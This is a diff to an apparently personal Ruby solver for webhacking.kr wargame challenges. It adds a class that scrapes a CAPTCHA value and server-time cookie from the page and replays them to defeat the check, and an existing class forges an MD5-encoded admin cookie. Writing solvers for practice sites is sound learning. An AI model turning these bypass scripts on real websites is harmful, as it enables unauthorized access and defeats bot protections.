@@ -44,6 +44,7 @@ module WebhackingKR
 
     def failed(message = 'Failed!')
       log(message)
+      false
     end
 
     def solved
@@ -57,12 +58,12 @@ module WebhackingKR
 
       if data =~ /old-#{n} Pwned/
         pwned
-        return
+        return true
       end
 
       if data =~ /already solved/
         solved
-        return
+        return true
       end
 
       failed
@@ -72,6 +73,12 @@ module WebhackingKR
     # Returns the data directory
     def data_dir
       File.join(DATA_DIR, "challenge#{self.class::CHALLENGE}")
+    end
+
+    ##
+    # Starts HTTP connection
+    def start
+      @client.start { yield if block_given? }
     end
 
     ##
@@ -208,7 +215,7 @@ module WebhackingKR
     LOGIN = 'admin'
 
     def exec
-      userid = Base64::strict_encode64(encode(LOGIN))
+      userid = Base64.strict_encode64(encode(LOGIN))
       log('Sending cookie')
       response = get(
         QUERY,
@@ -221,6 +228,48 @@ module WebhackingKR
 
     def encode(login)
       login.chars.map { |c| Digest::MD5.hexdigest(c) }.join
+    end
+  end
+
+  ##
+  # Challenge 20
+  class Challenge20 < ChallengeBase
+    CHALLENGE = 20
+
+    QUERY = '/challenge/code-4/'
+
+    def exec
+      start do
+        log('Getting page')
+        response = get(QUERY)
+        match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
+        failed unless match
+
+        cookie = response['Set-Cookie'].split('; ')
+        st = 0
+        cookie.each do |c|
+          w = c.split('=')
+          next unless w[0] == 'st'
+
+          st = w[1].to_i
+          break
+        end
+
+        log("Server time: #{st}")
+        log("Sending CAPTCHA: #{match[1]}")
+        response = post(
+          QUERY,
+          {
+            'id' => 'tester',
+            'cmt' => 'comment',
+            'captcha' => match[1]
+          },
+          { 'Cookie' => "st=#{st}" }
+        )
+        check(response.body)
+      rescue Interrupt
+        return
+      end
     end
   end
 end
